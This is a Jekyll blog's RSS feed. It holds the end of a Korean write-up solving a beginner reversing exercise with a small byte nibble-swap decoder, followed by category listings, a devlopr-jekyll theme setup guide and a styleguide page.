        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;#EOF then end the loop        tmp.append((((byte) &amp;lt;&amp;lt; 4)&amp;amp;0xFF)|((byte) &amp;gt;&amp;gt; 4))
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tmp_to_string&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;output&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;output&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tmp_to_string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;output&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;플래그 획득 완료!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2024-12-01-rev-basic-4/Untitled_4.png&quot; alt=&quot;/assets/img/posts/2024-12-01-rev-basic-4/Untitled_4.png&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;
</description>
        <pubDate>Sun, 01 Dec 2024 01:00:00 -0600</pubDate>
        <link>https://touBVa.github.io/blog/reversing/2024-12-01-rev-basic-4</link>
        <guid isPermaLink="true">https://touBVa.github.io/blog/reversing/2024-12-01-rev-basic-4</guid>
      </item>
    

    
      
    
      
    
      
    
      
    
      
    
      
    
      
        
      
    
      
        
          <item>
            <title>About</title>
            <description>&lt;p&gt;This is the base Jekyll theme. You can find out more info about customizing your Jekyll theme, as well as basic Jekyll usage documentation at &lt;a href=&quot;https://jekyllrb.com/&quot;&gt;jekyllrb.com&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;You can find the source code for Minima at GitHub:
&lt;a href=&quot;https://github.com/jekyll&quot;&gt;jekyll&lt;/a&gt; /
&lt;a href=&quot;https://github.com/jekyll/minima&quot;&gt;minima&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;You can find the source code for Jekyll at GitHub:
&lt;a href=&quot;https://github.com/jekyll&quot;&gt;jekyll&lt;/a&gt; /
&lt;a href=&quot;https://github.com/jekyll/jekyll&quot;&gt;jekyll&lt;/a&gt;&lt;/p&gt;

</description>
            <link>https://touBVa.github.io/about/</link>
          </item>
        
      
    
      
    
      
        
          <item>
            <title></title>
            <description>&lt;h3&gt;   &lt;/h3&gt;

&lt;div id=&quot;categories&quot;&gt;

  &lt;div class=&quot;category-box&quot;&gt;
    
    &lt;div id=&quot;#reversing&quot;&gt;&lt;/div&gt;
    &lt;h4 class=&quot;category-head&quot;&gt;&lt;a href=&quot;/blog/categories/reversing&quot;&gt;reversing&lt;/a&gt;&lt;/h4&gt;
    &lt;a name=&quot;reversing&quot;&gt;&lt;/a&gt;
     
    &lt;article class=&quot;center&quot;&gt;
      &lt;h6&gt;&lt;a href=&quot;/blog/reversing/2024-12-25-fsi-fiesta2024-S2-1&quot;&gt;FIESTA2024 S2-1 문제 풀이&lt;/a&gt;&lt;/h6&gt;
    &lt;/article&gt;


    
    &lt;article class=&quot;center&quot;&gt;
      &lt;h6&gt;&lt;a href=&quot;/blog/reversing/2024-12-01-rev-basic-8&quot;&gt;Dreamhack-rev-basic-8 문제 풀이&lt;/a&gt;&lt;/h6&gt;
    &lt;/article&gt;


    
    &lt;article class=&quot;center&quot;&gt;
      &lt;h6&gt;&lt;a href=&quot;/blog/reversing/2024-12-01-rev-basic-6&quot;&gt;Dreamhack-rev-basic-6 문제 풀이&lt;/a&gt;&lt;/h6&gt;
    &lt;/article&gt;


    
    &lt;article class=&quot;center&quot;&gt;
      &lt;h6&gt;&lt;a href=&quot;/blog/reversing/2024-12-01-rev-basic-4&quot;&gt;Dreamhack-rev-basic-4 문제 풀이&lt;/a&gt;&lt;/h6&gt;
    &lt;/article&gt;


    

  &lt;/div&gt;

  &lt;div class=&quot;category-box&quot;&gt;
    
    &lt;div id=&quot;#my_life&quot;&gt;&lt;/div&gt;
    &lt;h4 class=&quot;category-head&quot;&gt;&lt;a href=&quot;/blog/categories/my_life&quot;&gt;my_life&lt;/a&gt;&lt;/h4&gt;
    &lt;a name=&quot;my_life&quot;&gt;&lt;/a&gt;
     
    &lt;article class=&quot;center&quot;&gt;
      &lt;h6&gt;&lt;a href=&quot;/blog/Diary/241201&quot;&gt;2024년 회고&lt;/a&gt;&lt;/h6&gt;
    &lt;/article&gt;


    

  &lt;/div&gt;

  &lt;div class=&quot;category-box&quot;&gt;
    
    &lt;div id=&quot;#fuzzing&quot;&gt;&lt;/div&gt;
    &lt;h4 class=&quot;category-head&quot;&gt;&lt;a href=&quot;/blog/categories/fuzzing&quot;&gt;fuzzing&lt;/a&gt;&lt;/h4&gt;
    &lt;a name=&quot;fuzzing&quot;&gt;&lt;/a&gt;
     
    &lt;article class=&quot;center&quot;&gt;
      &lt;h6&gt;&lt;a href=&quot;/blog/fuzzing/2025-01-27-CVE-2024-28283&quot;&gt;CVE-2024-28283 분석과 KARONTE fuzzer 활용&lt;/a&gt;&lt;/h6&gt;
    &lt;/article&gt;


    
    &lt;article class=&quot;center&quot;&gt;
      &lt;h6&gt;&lt;a href=&quot;/blog/fuzzing/2025-01-26-KARONTE&quot;&gt;KARONTE: Detecting Insecure Multi-binary Interactions in Embedded Firmware 읽기&lt;/a&gt;&lt;/h6&gt;
    &lt;/article&gt;


    

  &lt;/div&gt;

  &lt;div class=&quot;category-box&quot;&gt;
    
    &lt;div id=&quot;#paper_study&quot;&gt;&lt;/div&gt;
    &lt;h4 class=&quot;category-head&quot;&gt;&lt;a href=&quot;/blog/categories/paper_study&quot;&gt;paper_study&lt;/a&gt;&lt;/h4&gt;
    &lt;a name=&quot;paper_study&quot;&gt;&lt;/a&gt;
     
    &lt;article class=&quot;center&quot;&gt;
      &lt;h6&gt;&lt;a href=&quot;/blog/fuzzing/2025-01-27-CVE-2024-28283&quot;&gt;CVE-2024-28283 분석과 KARONTE fuzzer 활용&lt;/a&gt;&lt;/h6&gt;
    &lt;/article&gt;


    
    &lt;article class=&quot;center&quot;&gt;
      &lt;h6&gt;&lt;a href=&quot;/blog/fuzzing/2025-01-26-KARONTE&quot;&gt;KARONTE: Detecting Insecure Multi-binary Interactions in Embedded Firmware 읽기&lt;/a&gt;&lt;/h6&gt;
    &lt;/article&gt;


    

  &lt;/div&gt;

  &lt;div class=&quot;category-box&quot;&gt;
    
    &lt;div id=&quot;#forensic&quot;&gt;&lt;/div&gt;
    &lt;h4 class=&quot;category-head&quot;&gt;&lt;a href=&quot;/blog/categories/forensic&quot;&gt;forensic&lt;/a&gt;&lt;/h4&gt;
    &lt;a name=&quot;forensic&quot;&gt;&lt;/a&gt;
     
    &lt;article class=&quot;center&quot;&gt;
      &lt;h6&gt;&lt;a href=&quot;/blog/forensic/2025-01-29-FIESTA2024-S-4-3&quot;&gt;FIESTA2024 S-4-3 풀이&lt;/a&gt;&lt;/h6&gt;
    &lt;/article&gt;


    
    &lt;article class=&quot;center&quot;&gt;
      &lt;h6&gt;&lt;a href=&quot;/blog/forensic/2025-01-29-FIESTA2024-S-4-2&quot;&gt;FIESTA2024 S-4-2 풀이&lt;/a&gt;&lt;/h6&gt;
    &lt;/article&gt;


    
    &lt;article class=&quot;center&quot;&gt;
      &lt;h6&gt;&lt;a href=&quot;/blog/forensic/2025-01-29-FIESTA2024-S-4-1&quot;&gt;FIESTA2024 S-4-1 풀이&lt;/a&gt;&lt;/h6&gt;
    &lt;/article&gt;


    

  &lt;/div&gt;

&lt;/div&gt;

</description>
            <link>https://touBVa.github.io/blog/categories/</link>
          </item>
        
      
    
      
        
          <item>
            <title>certification_study</title>
            <description>&lt;h5&gt; Posts by Category : certification_study &lt;/h5&gt;

&lt;div class=&quot;card&quot;&gt;

&lt;/div&gt;
</description>
            <link>https://touBVa.github.io/blog/categories/blockchain/</link>
          </item>
        
      
    
      
        
          <item>
            <title>certification_study</title>
            <description>&lt;h5&gt; Posts by Category : certification_study &lt;/h5&gt;

&lt;div class=&quot;card&quot;&gt;

&lt;/div&gt;
</description>
            <link>https://touBVa.github.io/blog/categories/certification_study/</link>
          </item>
        
      
    
      
    
      
        
          <item>
            <title>system_hacking_basic</title>
            <description>&lt;h5&gt; Posts by Category : system_hacking_basic &lt;/h5&gt;

&lt;div class=&quot;card&quot;&gt;

&lt;/div&gt;
</description>
            <link>https://touBVa.github.io/blog/categories/dreamhack_system_hacking/</link>
          </item>
        
      
    
      
    
      
        
          <item>
            <title>Web Hacking</title>
            <description>&lt;h5&gt; Posts by Category : {{ page.title }} &lt;/h5&gt;

&lt;div class=&quot;card&quot;&gt;
{% for post in site.categories.forensic %}
 &lt;li class=&quot;category-posts&quot;&gt;&lt;span&gt;{{ post.date | date_to_string }}&lt;/span&gt; &amp;nbsp; &lt;a href=&quot;{{ post.url }}&quot;&gt;{{ post.title }}&lt;/a&gt;&lt;/li&gt;
{% endfor %}
&lt;/div&gt;</description>
            <link>https://touBVa.github.io/blog/categories/forensic/</link>
          </item>
        
      
    
      
        
          <item>
            <title>fuzzing</title>
            <description>&lt;h5&gt; Posts by Category : {{ page.title }} &lt;/h5&gt;

&lt;div class=&quot;card&quot;&gt;
{% for post in site.categories.fuzzing %}
 &lt;li class=&quot;category-posts&quot;&gt;&lt;span&gt;{{ post.date | date_to_string }}&lt;/span&gt; &amp;nbsp; &lt;a href=&quot;{{ post.url }}&quot;&gt;{{ post.title }}&lt;/a&gt;&lt;/li&gt;
{% endfor %}
&lt;/div&gt;</description>
            <link>https://touBVa.github.io/blog/categories/fuzzing/</link>
          </item>
        
      
    
      
    
      
    
      
    
      
    
      
        
          <item>
            <title>Get Started</title>
            <description>## Getting Started - How to use “devlopr-jekyll” theme

## What&apos;s Jekyll ?

If you aren’t familiar with Jekyll yet, you should know that it is a static site generator. It will transform your plain text into static websites and blogs. No more databases, slow loading websites, risk of being hacked…just your content. And not only that, with Jekyll you get free hosting with GitHub Pages! If you are a beginner we recommend you start with [Jekyll’s Docs](https://jekyllrb.com/docs/installation/). Now, if you know how to use Jekyll, let’s move on to using this theme in Jekyll:

## Watch Tutorial

&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/cXBEfpn0qrg?rel=0&amp;amp;controls=0&amp;amp;showinfo=0&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen&gt;&lt;/iframe&gt;


### Steps to create your blog using devlopr-jekyll and Host using Github Pages :

&gt;  **Step 1.**  Fork the repo - [click here](https://github.com/sujaykundu777/devlopr-jekyll/fork)

![Devlopr Jekyll Repo](/assets/img/posts/fork1.PNG){:class=&quot;img-fluid&quot;}

&gt; **Step 2.** Use **your-github-username.github.io** as the new repo  ( Replace your-github-username with yours). Remember if you use the name other than your-github-username.github.io , your blog will be built using gh-pages branch.

![Devlopr Jekyll Repo](/assets/img/posts/fork2.PNG){:class=&quot;img-fluid&quot;}

![Devlopr Jekyll Repo](/assets/img/posts/fork3.PNG){:class=&quot;img-fluid&quot;}

&gt; **Step 3.** Clone the new repo locally to make changes :

![Devlopr Jekyll Repo](/assets/img/posts/fork31.PNG){:class=&quot;img-fluid&quot;}

![Devlopr Jekyll Repo](/assets/img/posts/fork32.PNG){:class=&quot;img-fluid&quot;}

![Devlopr Jekyll Repo](/assets/img/posts/fork33.PNG){:class=&quot;img-fluid&quot;}

```bash
 $ git clone https://github.com/yourusername/yourusername.github.io
 $ cd yourusername.github.io
 $ code .
```

&gt; **Step 4.** Open the files using VSCode and edit _config.yml and edit with your details:

- _config.yml file - replace with your own details
- _posts - Add your blog posts here
- _includes - You can replace the contents of the files with your data. (contains widgets)
- _assets/img - Add all your images here

![Devlopr Jekyll Repo](/assets/img/posts/fork34.PNG){:class=&quot;img-fluid&quot;}

&gt; **Step 5** - Install the development requirements:

### Set up local development environment

1. [Git](https://git-scm.com/)
2. [Ruby](https://www.ruby-lang.org/) and [Bundler](https://bundler.io/)
3. [VSCode](https://code.visualstudio.com/download)

We need ruby and bundler to build our site locally. After installation check if its working:

For ruby :

```bash
$ ruby -v
ruby 2.5.1p57 (2018-03-29 revision 63029) [x86_64-linux-gnu]
```
For bundler :

```bash
$ gem install bundler
$ bundler -v
Bundler version 2.2.29
```
Add jekyll :

```bash
$ bundle update
$ bundle add jekyll
```
 This command will add the Jekyll gem to our Gemfile and install it to the ./vendor/bundle/ folder.

You can check the jekyll version

```
$ bundle exec jekyll -v
jekyll 4.2.0
```

&gt; **Step 6.** Install the gem dependencies by running the following command

```bash
$ bundle update
$ bundle install
```

&gt; **Step 7.** Serve the site locally by running the following command below:

```bash
$ bundle exec jekyll serve --watch
```
or you can also serve using :

```bash
$ jekyll serve
```

Visit [http://localhost:4000](http://localhost:4000) for development server

![Devlopr Jekyll Repo](/assets/img/posts/fork41.PNG){:class=&quot;img-fluid&quot;}


### Adding Content

Start populating your blog by adding your .md files in _posts. devlopr-jekyll already has a few examples.

#### YAML Post Example:

```yml
---
layout: post
title: Sample Post
author: Sujay Kundu
date: &apos;2019-05-21 14:35:23 +0530&apos;
category:
        - jekyll
summary: This is the summary for the sample post
thumbnail: sample.png
---

Hi ! This is sample post.

```

#### YAML Page Example:

```yml
---
layout: page
title: Sample Page
permalink: /sample-page/
---

Hi ! This is sample page.
```

#### Editing stylesheet

You’ll only work with a single file to edit/add theme style: assets/css/main.scss.

### Deploy your Changes

Once happy with your blog changes. Push your changes to master branch.

&gt; **Step 8.** Push Your Local Changes

```bash
 $ git add .
 $ git commit -m &quot;my new blog using devlopr-jekyll&quot;
 $ git push origin master
```

Visit your Github Repo settings ! Enable master branch as Github Pages Branch :

![Devlopr Jekyll Repo](/assets/img/posts/fork6.PNG){:class=&quot;img-fluid&quot;}

&gt; **Step 9.** Deploy your Blog :

![Devlopr Jekyll Repo](/assets/img/posts/fork7.PNG){:class=&quot;img-fluid&quot;}

&gt; Congrats ! On your new shining Blog !

You can visit the blog using [http://your-github-username.github.io](http://your-github-username.github.io).

</description>
            <link>https://touBVa.github.io/get-started/</link>
          </item>
        
      
    
      
    
      
    
      
        
          <item>
            <title>my_life</title>
            <description>&lt;h5&gt; Posts by Category : {{ page.title }} &lt;/h5&gt;

&lt;div class=&quot;card&quot;&gt;
{% for post in site.categories.my_life %}
 &lt;li class=&quot;category-posts&quot;&gt;&lt;span&gt;{{ post.date | date_to_string }}&lt;/span&gt; &amp;nbsp; &lt;a href=&quot;{{ post.url }}&quot;&gt;{{ post.title }}&lt;/a&gt;&lt;/li&gt;
{% endfor %}
&lt;/div&gt;</description>
            <link>https://touBVa.github.io/blog/categories/my_life/</link>
          </item>
        
      
    
      
        
          <item>
            <title>certification_study</title>
            <description>&lt;h5&gt; Posts by Category : {{ page.title }} &lt;/h5&gt;

&lt;div class=&quot;card&quot;&gt;
{% for post in site.categories.network_hacking %}
 &lt;li class=&quot;category-posts&quot;&gt;&lt;span&gt;{{ post.date | date_to_string }}&lt;/span&gt; &amp;nbsp; &lt;a href=&quot;{{ post.url }}&quot;&gt;{{ post.title }}&lt;/a&gt;&lt;/li&gt;
{% endfor %}
&lt;/div&gt;</description>
            <link>https://touBVa.github.io/blog/categories/network_hacking/</link>
          </item>
        
      
    
      
        
          <item>
            <title>paper_study</title>
            <description>&lt;h5&gt; Posts by Category : {{ page.title }} &lt;/h5&gt;

&lt;div class=&quot;card&quot;&gt;
{% for post in site.categories.paper_study %}
 &lt;li class=&quot;category-posts&quot;&gt;&lt;span&gt;{{ post.date | date_to_string }}&lt;/span&gt; &amp;nbsp; &lt;a href=&quot;{{ post.url }}&quot;&gt;{{ post.title }}&lt;/a&gt;&lt;/li&gt;
{% endfor %}
&lt;/div&gt;</description>
            <link>https://touBVa.github.io/blog/categories/paper_study/</link>
          </item>
        
      
    
      
        
          <item>
            <title>protostar</title>
            <description>&lt;h5&gt; Posts by Category : {{ page.title }} &lt;/h5&gt;

&lt;div class=&quot;card&quot;&gt;
{% for post in site.categories.protostar %}
 &lt;li class=&quot;category-posts&quot;&gt;&lt;span&gt;{{ post.date | date_to_string }}&lt;/span&gt; &amp;nbsp; &lt;a href=&quot;{{ post.url }}&quot;&gt;{{ post.title }}&lt;/a&gt;&lt;/li&gt;
{% endfor %}
&lt;/div&gt;</description>
            <link>https://touBVa.github.io/blog/categories/protostar/</link>
          </item>
        
      
    
      
        
          <item>
            <title>reversing</title>
            <description>&lt;h5&gt; Posts by Category : {{ page.title }} &lt;/h5&gt;

&lt;div class=&quot;card&quot;&gt;
{% for post in site.categories.reversing %}
 &lt;li class=&quot;category-posts&quot;&gt;&lt;span&gt;{{ post.date | date_to_string }}&lt;/span&gt; &amp;nbsp; &lt;a href=&quot;{{ post.url }}&quot;&gt;{{ post.title }}&lt;/a&gt;&lt;/li&gt;
{% endfor %}
&lt;/div&gt;</description>
            <link>https://touBVa.github.io/blog/categories/reversing/</link>
          </item>
        
      
    
      
        
          <item>
            <title>Guides</title>
            <description>&lt;h5&gt; Posts by Category : {{ page.title }} &lt;/h5&gt;

&lt;div class=&quot;card&quot;&gt;
{% for post in site.categories.sample_category %}
 &lt;li class=&quot;category-posts&quot;&gt;&lt;span&gt;{{ post.date | date_to_string }}&lt;/span&gt; &amp;nbsp; &lt;a href=&quot;{{ post.url }}&quot;&gt;{{ post.title }}&lt;/a&gt;&lt;/li&gt;
{% endfor %}
&lt;/div&gt;</description>
            <link>https://touBVa.github.io/blog/categories/sample_category/</link>
          </item>
        
      
    
      
    
      
        
          <item>
            <title>Our Sponsors</title>
            <description>Thanks to all the amazing contributors and our Backers for the support.

- [Dirish Mohan](https://dirishmohan.com)</description>
            <link>https://touBVa.github.io/sponsors/</link>
          </item>
        
      
    
      
        
          <item>
            <title>Styleguide</title>
            <description>### devlopr - Styleguide

&lt;hr /&gt;

 &lt;img src=&quot;/assets/img/styleguide.png&quot; class=&quot;img-fluid&quot;&gt;

&lt;p&gt; Lets try the different text styles  &lt;b&gt; Bold &lt;/b&gt; , &lt;strong&gt; Strong &lt;/strong&gt;, &lt;em&gt; Emphasis &lt;/em&gt;, &lt;i&gt; Italic &lt;/i&gt; &lt;/p&gt;


&lt;p&gt; Now, lets try different heading styles : &lt;/p&gt;

&lt;h1&gt; Hello in h1 ! &lt;/h1&gt;
&lt;h2&gt; Hello in h2 ! &lt;/h2&gt;
&lt;h3&gt; Hello in h3 ! &lt;/h3&gt;
&lt;h4&gt; Hello in h4 ! &lt;/h4&gt;
&lt;h5&gt; Hello in h5 ! &lt;/h5&gt;
&lt;h6&gt; Hello in h6 ! &lt;/h6&gt;

&lt;hr /&gt;
&lt;p&gt; Unordered List &lt;/p&gt;

&lt;ul&gt;
&lt;li&gt; List Item 1 &lt;/li&gt;
&lt;li&gt; List Item 2 &lt;/li&gt;
&lt;li&gt; List Item 3 &lt;/li&gt;
&lt;li&gt; List Item 4 &lt;/li&gt;
&lt;li&gt; List Item 5 &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt; Ordered List &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt; List Item 1 &lt;/li&gt;
&lt;li&gt; List Item 2 &lt;/li&gt;
&lt;li&gt; List Item 3 &lt;/li&gt;
&lt;li&gt; List Item 4 &lt;/li&gt;
&lt;li&gt; List Item 5 &lt;/li&gt;
&lt;/ol&gt;

&lt;blockquote&gt;
&lt;p&gt;This is a Block Quote,  It can Expand Multiple Lines &lt;/p&gt;

&lt;/blockquote&gt;

&lt;p&gt;You can use the mark tag to &lt;mark&gt;highlight&lt;/mark&gt; text. &lt;/p&gt;

&lt;p&gt;&lt;del&gt; This line of text is meant to be deleted text &lt;/del&gt; &lt;/p&gt;

&lt;p&gt;&lt;u&gt;This line of text will render as underlined&lt;/u&gt;&lt;/p&gt;
&lt;p&gt;&lt;small&gt;This line of text is meant to be treated as fine print.&lt;/small&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;This line rendered as bold text.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;This line rendered as italicized text.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;abbr title=&quot;attribute&quot;&gt;attr&lt;/abbr&gt;&lt;/p&gt;
&lt;p&gt;&lt;abbr title=&quot;HyperText Markup Language&quot; class=&quot;initialism&quot;&gt;HTML&lt;/abbr&gt;&lt;/p&gt;

&lt;hr /&gt;
&lt;div class=&quot;responsive-table&quot;&gt;
&lt;table&gt;
      &lt;thead&gt;
        &lt;tr&gt;
          &lt;th scope=&quot;col&quot;&gt;#&lt;/th&gt;
          &lt;th scope=&quot;col&quot;&gt;Heading&lt;/th&gt;
          &lt;th scope=&quot;col&quot;&gt;Heading&lt;/th&gt;
          &lt;th scope=&quot;col&quot;&gt;Heading&lt;/th&gt;
          &lt;th scope=&quot;col&quot;&gt;Heading&lt;/th&gt;
          &lt;th scope=&quot;col&quot;&gt;Heading&lt;/th&gt;
          &lt;th scope=&quot;col&quot;&gt;Heading&lt;/th&gt;
          &lt;th scope=&quot;col&quot;&gt;Heading&lt;/th&gt;
          &lt;th scope=&quot;col&quot;&gt;Heading&lt;/th&gt;
          &lt;th scope=&quot;col&quot;&gt;Heading&lt;/th&gt;
        &lt;/tr&gt;
      &lt;/thead&gt;
      &lt;tbody&gt;
        &lt;tr&gt;
          &lt;th scope=&quot;row&quot;&gt;1&lt;/th&gt;
          &lt;td&gt;Cell&lt;/td&gt;
          &lt;td&gt;Cell&lt;/td&gt;
          &lt;td&gt;Cell&lt;/td&gt;
          &lt;td&gt;Cell&lt;/td&gt;
          &lt;td&gt;Cell&lt;/td&gt;
          &lt;td&gt;Cell&lt;/td&gt;
          &lt;td&gt;Cell&lt;/td&gt;
          &lt;td&gt;Cell&lt;/td&gt;
          &lt;td&gt;Cell&lt;/td&gt;
        &lt;/tr&gt;
        &lt;tr&gt;
          &lt;th scope=&quot;row&quot;&gt;2&lt;/th&gt;
          &lt;td&gt;Cell&lt;/td&gt;
          &lt;td&gt;Cell&lt;/td&gt;
          &lt;td&gt;Cell&lt;/td&gt;
          &lt;td&gt;Cell&lt;/td&gt;
          &lt;td&gt;Cell&lt;/td&gt;
          &lt;td&gt;Cell&lt;/td&gt;
          &lt;td&gt;Cell&lt;/td&gt;
          &lt;td&gt;Cell&lt;/td&gt;
          &lt;td&gt;Cell&lt;/td&gt;
        &lt;/tr&gt;
        &lt;tr&gt;
          &lt;th scope=&quot;row&quot;&gt;3&lt;/th&gt;
          &lt;td&gt;Cell&lt;/td&gt;
          &lt;td&gt;Cell&lt;/td&gt;
          &lt;td&gt;Cell&lt;/td&gt;
          &lt;td&gt;Cell&lt;/td&gt;
          &lt;td&gt;Cell&lt;/td&gt;
          &lt;td&gt;Cell&lt;/td&gt;
          &lt;td&gt;Cell&lt;/td&gt;
          &lt;td&gt;Cell&lt;/td&gt;
          &lt;td&gt;Cell&lt;/td&gt;
        &lt;/tr&gt;
      &lt;/tbody&gt;
    &lt;/table&gt;
    &lt;/div&gt;

&lt;hr /&gt;

&lt;h3&gt; Instagram Embed &lt;/h3&gt;

&lt;blockquote class=&quot;instagram-media&quot; data-instgrm-captioned data-instgrm-permalink=&quot;https://www.instagram.com/p/CBXO7AypXkM/?utm_source=ig_embed&amp;amp;utm_campaign=loading&quot; data-instgrm-version=&quot;13&quot; style=&quot; background:#FFF; border:0; border-radius:3px; box-shadow:0 0 1px 0 rgba(0,0,0,0.5),0 1px 10px 0 rgba(0,0,0,0.15); margin: 1px; max-width:540px; min-width:326px; padding:0; width:99.375%; width:-webkit-calc(100% - 2px); width:calc(100% - 2px);&quot;&gt;&lt;div style=&quot;padding:16px;&quot;&gt; &lt;a href=&quot;https://www.instagram.com/p/CBXO7AypXkM/?utm_source=ig_embed&amp;amp;utm_campaign=loading&quot; style=&quot; background:#FFFFFF; line-height:0; padding:0 0; text-align:center; text-decoration:none; width:100%;&quot; target=&quot;_blank&quot;&gt; &lt;div style=&quot; display: flex; flex-direction: row; align-items: center;&quot;&gt; &lt;div style=&quot;background-color: #F4F4F4; border-radius: 50%; flex-grow: 0; height: 40px; margin-right: 14px; width: 40px;&quot;&gt;&lt;/div&gt; &lt;div style=&quot;display: flex; flex-direction: column; flex-grow: 1; justify-content: center;&quot;&gt; &lt;div style=&quot; background-color: #F4F4F4; border-radius: 4px; flex-grow: 0; height: 14px; margin-bottom: 6px; width: 100px;&quot;&gt;&lt;/div&gt; &lt;div style=&quot; background-color: #F4F4F4; border-radius: 4px; flex-grow: 0; height: 14px; width: 60px;&quot;&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div style=&quot;padding: 19% 0;&quot;&gt;&lt;/div&gt; &lt;div style=&quot;display:block; height:50px; margin:0 auto 12px; width:50px;&quot;&gt;&lt;svg width=&quot;50px&quot; height=&quot;50px&quot; viewBox=&quot;0 0 60 60&quot; version=&quot;1.1&quot; xmlns=&quot;https://www.w3.org/2000/svg&quot; xmlns:xlink=&quot;https://www.w3.org/1999/xlink&quot;&gt;&lt;g stroke=&quot;none&quot; stroke-width=&quot;1&quot; fill=&quot;none&quot; fill-rule=&quot;evenodd&quot;&gt;&lt;g transform=&quot;translate(-511.000000, -20.000000)&quot; fill=&quot;#000000&quot;&gt;&lt;g&gt;&lt;path d=&quot;M556.869,30.41 C554.814,30.41 553.148,32.076 553.148,34.131 C553.148,36.186 554.814,37.852 556.869,37.852 C558.924,37.852 560.59,36.186 560.59,34.131 C560.59,32.076 558.924,30.41 556.869,30.41 M541,60.657 C535.114,60.657 530.342,55.887 530.342,50 C530.342,44.114 535.114,39.342 541,39.342 C546.887,39.342 551.658,44.114 551.658,50 C551.658,55.887 546.887,60.657 541,60.657 M541,33.886 C532.1,33.886 524.886,41.1 524.886,50 C524.886,58.899 532.1,66.113 541,66.113 C549.9,66.113 557.115,58.899 557.115,50 C557.115,41.1 549.9,33.886 541,33.886 M565.378,62.101 C565.244,65.022 564.756,66.606 564.346,67.663 C563.803,69.06 563.154,70.057 562.106,71.106 C561.058,72.155 560.06,72.803 558.662,73.347 C557.607,73.757 556.021,74.244 553.102,74.378 C549.944,74.521 548.997,74.552 541,74.552 C533.003,74.552 532.056,74.521 528.898,74.378 C525.979,74.244 524.393,73.757 523.338,73.347 C521.94,72.803 520.942,72.155 519.894,71.106 C518.846,70.057 518.197,69.06 517.654,67.663 C517.244,66.606 516.755,65.022 516.623,62.101 C516.479,58.943 516.448,57.996 516.448,50 C516.448,42.003 516.479,41.056 516.623,37.899 C516.755,34.978 517.244,33.391 517.654,32.338 C518.197,30.938 518.846,29.942 519.894,28.894 C520.942,27.846 521.94,27.196 523.338,26.654 C524.393,26.244 525.979,25.756 528.898,25.623 C532.057,25.479 533.004,25.448 541,25.448 C548.997,25.448 549.943,25.479 553.102,25.623 C556.021,25.756 557.607,26.244 558.662,26.654 C560.06,27.196 561.058,27.846 562.106,28.894 C563.154,29.942 563.803,30.938 564.346,32.338 C564.756,33.391 565.244,34.978 565.378,37.899 C565.522,41.056 565.552,42.003 565.552,50 C565.552,57.996 565.522,58.943 565.378,62.101 M570.82,37.631 C570.674,34.438 570.167,32.258 569.425,30.349 C568.659,28.377 567.633,26.702 565.965,25.035 C564.297,23.368 562.623,22.342 560.652,21.575 C558.743,20.834 556.562,20.326 553.369,20.18 C550.169,20.033 549.148,20 541,20 C532.853,20 531.831,20.033 528.631,20.18 C525.438,20.326 523.257,20.834 521.349,21.575 C519.376,22.342 517.703,23.368 516.035,25.035 C514.368,26.702 513.342,28.377 512.574,30.349 C511.834,32.258 511.326,34.438 511.181,37.631 C511.035,40.831 511,41.851 511,50 C511,58.147 511.035,59.17 511.181,62.369 C511.326,65.562 511.834,67.743 512.574,69.651 C513.342,71.625 514.368,73.296 516.035,74.965 C517.703,76.634 519.376,77.658 521.349,78.425 C523.257,79.167 525.438,79.673 528.631,79.82 C531.831,79.965 532.853,80.001 541,80.001 C549.148,80.001 550.169,79.965 